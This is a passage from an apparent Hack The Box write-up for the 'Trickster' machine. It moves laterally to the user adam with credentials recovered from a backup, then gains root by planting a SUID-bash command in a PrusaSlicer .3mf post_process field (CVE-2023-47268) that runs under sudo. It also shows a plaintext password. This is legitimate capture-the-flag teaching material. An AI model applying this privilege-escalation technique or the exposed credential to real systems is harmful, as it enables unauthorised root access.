┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Trickster/privEsc/backup_zips/b4a8b52d-651b-44bc-bbc6-f9e8c6590103]
└──╼ [★]$ ll
total 20K
drwxrwxr-x 1 tatsuki tatsuki  172 25 nov.  17:11 .
drwxr-xr-x 1 tatsuki tatsuki  356 25 nov.  17:07 ..
-rw-r--r-- 1 tatsuki tatsuki  12K 31 août  01:47 f04f0732f120c0cc84a993ad99decb2c.txt
-rw-r--r-- 1 tatsuki tatsuki 2,6K 31 août  01:47 f04f0732f120c0cc84a993ad99decb2c.txt.br
-rw-r--r-- 1 tatsuki tatsuki   51 31 août  01:47 history.txt
```
  
Opening the decompressed file reveals credentials for the ``adam`` user.
  
![](/assets/img/HTB-Trickster_11-2.png)
  
Using the credentials recovered from the container backup, we were able to authenticate on the main host as ``adam``.
  
```shell
james@trickster:/tmp/backups$ su - adam
Password: 
adam@trickster:~$
```

---

### Adam -> root
  
As ``adam``, the first thing we check is sudo permissions.
  
```shell
adam@trickster:~$ sudo -l
Matching Defaults entries for adam on trickster:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
User adam may run the following commands on trickster:
    (ALL) NOPASSWD: /opt/PrusaSlicer/prusaslicer
```
  
As we can see, ``adam`` can run ``/opt/PrusaSlicer/prusaslicer`` as root without a password. 
Running the binary shows it's version ``2.6.1``, which is vulnerable to CVE-2023-47268, a command injection flaw where PrusaSlicer fails to sanitize or validate user-supplied post-processing commands embedded in ``.3mf`` project files.
  
```shell
adam@trickster:~$ /opt/PrusaSlicer/prusaslicer
DISPLAY not set, GUI mode not available.
PrusaSlicer-2.6.1+linux-x64-GTK2-202309060801 based on Slic3r (with GUI support)
https://github.com/prusa3d/PrusaSlicer
Usage: prusa-slicer [ ACTIONS ] [ TRANSFORM ] [ OPTIONS ] [ file.stl ... ]
```

#### PrusaSlicer Exploitation (CVE-2023-47268)
  
The vulnerability works as follows :

1. Reads metadata from ``.3mf`` project files, specifically from ``Metadata/Slic3r_PE.config``.
2. That file includes a ``post_process`` setting, which allows specifying a script or command to run after slicing.
3. Because no sanitization or validation is applied to this setting, a crafted ``.3mf`` file can embed arbitrary shell commands that execute during the slicing process.

Since ``adam`` can run PrusaSlicer as root via sudo, any command injected through ``post_process`` will execute with root privileges. 
  
```shell
adam@trickster:~$ ll /opt/PrusaSlicer/
total 82196
drwxr-xr-x 2 root root     4096 Sep 13 12:24 ./
drwxr-xr-x 5 root root     4096 Sep 13 12:24 ../
-rwxr-xr-x 1 root root 84018368 Sep  6  2023 prusaslicer*
-rw-r--r-- 1 root root   138526 May 23  2024 TRICKSTER.3mf
```
  
A ``.3mf`` file is already available at ``/opt/PrusaSlicer/TRICKSTER.3mf``, so it's transferred to the attacking machine for editing.
  
```shell
adam@trickster:/opt/PrusaSlicer$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
  
```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Trickster/privEsc]
└──╼ [★]$ mkdir prusaslicer

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Trickster/privEsc]
└──╼ [★]$ cd prusaslicer/

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Trickster/privEsc/prusaslicer]
└──╼ [★]$ wget http://10.129.81.235:8000/TRICKSTER.3mf
--2024-11-25 19:13:22--  http://10.129.81.235:8000/TRICKSTER.3mf
Connecting to 10.129.81.235:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 138526 (135K) [application/vnd.ms-3mfdocument]
Saving to: ‘TRICKSTER.3mf'
TRICKSTER.3mf                   100%[=====================================================>] 135,28K   782KB/s    in 0,2s    
2024-11-25 19:13:22 (782 KB/s) - ‘TRICKSTER.3mf' saved [138526/138526]
```
  
Since a ``.3mf`` file is a ZIP archive, it's simply unzipped for editing.
  
```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Trickster/privEsc/prusaslicer]
└──╼ [★]$ file TRICKSTER.3mf 
TRICKSTER.3mf: Zip archive data, at least v2.0 to extract, compression method=deflate

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Trickster/privEsc/prusaslicer]
└──╼ [★]$ unzip TRICKSTER.3mf
Archive:  TRICKSTER.3mf
  inflating: [Content_Types].xml     
  inflating: Metadata/thumbnail.png  
  inflating: _rels/.rels             
  inflating: 3D/3dmodel.model        
  inflating: Metadata/Slic3r_PE.config  
  inflating: Metadata/Slic3r_PE_model.config
```
  
Opening ``Metadata/Slic3r_PE.config`` and locating the ``post_process`` field shows it's empty.
  
![](/assets/img/HTB-Trickster_12.png)
  
The field is populated with commands to copy ``/bin/bash`` to ``/tmp/root-bash`` and set the SUID bit as root.
  
![](/assets/img/HTB-Trickster_13.png)
  
The modified files are repackaged into a new archive and transferred to the target.
  
```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Trickster/privEsc/prusaslicer]
└──╼ [★]$ zip -r ../malicious.3mf *
  adding: 3D/ (stored 0%)
  adding: 3D/3dmodel.model (deflated 82%)
  adding: [Content_Types].xml (deflated 45%)
  adding: Metadata/ (stored 0%)
  adding: Metadata/thumbnail.png (deflated 1%)
  adding: Metadata/Slic3r_PE.config (deflated 69%)
  adding: Metadata/Slic3r_PE_model.config (deflated 83%)
  adding: _rels/ (stored 0%)
  adding: _rels/.rels (deflated 47%)
  adding: TRICKSTER.3mf (deflated 3%)
  
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Trickster/privEsc/prusaslicer]
└──╼ [★]$ file ../malicious.3mf 
../malicious.3mf: Zip archive data, at least v1.0 to extract, compression method=store

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Trickster/privEsc/prusaslicer]
└──╼ [★]$ scp ../malicious.3mf adam@trickster.htb:~/
adam@trickster.htb's password: 
malicious.3mf
```
  
Running PrusaSlicer with the malicious file throws an error during slicing, the ``output_filename_format`` template references an undefined variable (``nozzle_diameter[initial_tool]``).
  
```shell
adam@trickster:~$ sudo /opt/PrusaSlicer/prusaslicer -s malicious.3mf 
10 => Processing triangulated mesh
10 => Processing triangulated mesh
20 => Generating perimeters
20 => Generating perimeters
<SNIP>
Failed processing of the output_filename_format template.
Parsing error at line 1: Non-integer index is not allowed to address a vector variable.
{input_filename_base}_{nozzle_diameter[initial_tool]}n_{layer_height}mm_{printing_filament_types}_{printer_model}_{print_time}.gcode
                                       ^
```
  
This is fixed by replacing the problematic template string with a simple static output filename (``output.gcode``).
  
![](/assets/img/HTB-Trickster_14.png)
  
The archive is repackaged and re-uploaded.
  
```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Trickster/privEsc/prusaslicer]
└──╼ [★]$ scp ../malicious2.3mf adam@trickster.htb:~/
adam@trickster.htb's password: adam_admin992
malicious2.3mf
```
  
This time, PrusaSlicer slices the file cleanly without errors.
  
```shell
adam@trickster:~$ sudo /opt/PrusaSlicer/prusaslicer -s malicious2.3mf 
10 => Processing triangulated mesh
10 => Processing triangulated mesh
20 => Generating perimeters
20 => Generating perimeters
<SNIP>
88 => Generating skirt and brim
90 => Exporting G-code to output.gcode
Slicing result exported to output.gcode
```
  
This time it run without any errors, and the SUID root bash binary has been created in ``/tmp`` :
  
```shell
adam@trickster:~$ ll /tmp/root-bash 
-rwsr-xr-x 1 root root 1396520 Nov 25 18:34 /tmp/root-bash*
```

Executing it with the ``-p`` flag preserves the effective UID, granting a root shell.
  
```shell
adam@trickster:~$ /tmp/root-bash -p
root-bash-5.1# id
uid=1002(adam) gid=1002(adam) euid=0(root) groups=1002(adam)
root-bash-5.1# cat /root/root.txt 
c5f0XXXXXXXXXXXXXXXXXXXXXXX1a132
```
  
---

## Resources
  
- [https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/](https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/)
- [https://devdocs.prestashop-project.org/8/development/configuration/configuring-prestashop](https://devdocs.prestashop-project.org/8/development/configuration/configuring-prestashop)
- [https://github.com/s0ck3t-s3c/CVE-2024-32651-changedetection-RCE](https://github.com/s0ck3t-s3c/CVE-2024-32651-changedetection-RCE)
- [https://blog.hacktivesecurity.com/index.php/2024/05/08/cve-2024-32651-server-side-template-injection-changedetection-io/](https://blog.hacktivesecurity.com/index.php/2024/05/08/cve-2024-32651-server-side-template-injection-changedetection-io/)
- [https://www.exploit-db.com/exploits/51983](https://www.exploit-db.com/exploits/51983)